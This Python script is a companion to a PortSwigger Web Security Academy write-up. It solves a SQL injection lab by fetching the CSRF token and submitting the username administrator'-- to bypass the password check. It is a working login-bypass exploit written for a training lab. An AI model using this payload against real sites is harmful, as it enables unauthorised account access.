#!/usr/bin/env python3
"""
SQL injection vulnerability allowing login bypass
PortSwigger Web Security Academy -- SQL Injection

Companion script for the writeup: 02-login-bypass.md

What this does:
    Submits the login form with a username of administrator'-- , which closes the
    username string and comments out the trailing password check in the backend
    query. The database only evaluates username = 'administrator', logging us in
    without ever checking a password.

Usage:
    python 02-login-bypass.py <lab-url>

Requirements:
    pip install httpx
"""

import re
import sys
import httpx


def get_csrf(client: httpx.Client, url: str) -> str:
    r = client.get(url)
    m = re.search(r'name="csrf"\s+value="([^"]+)"', r.text)
    return m.group(1) if m else ""


def solve(lab_url: str) -> None:
    client = httpx.Client(follow_redirects=True, timeout=15)
    csrf = get_csrf(client, f"{lab_url}/login")

    r = client.post(f"{lab_url}/login", data={
        "username": "administrator'-- ",
        "password": "anything",
        "csrf": csrf,
    })

    if "Log out" in r.text or "/my-account" in str(r.url):
        print("[+] Logged in as administrator without a valid password.")
    else:
        print("[-] Login did not succeed -- check the CSRF token or payload.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
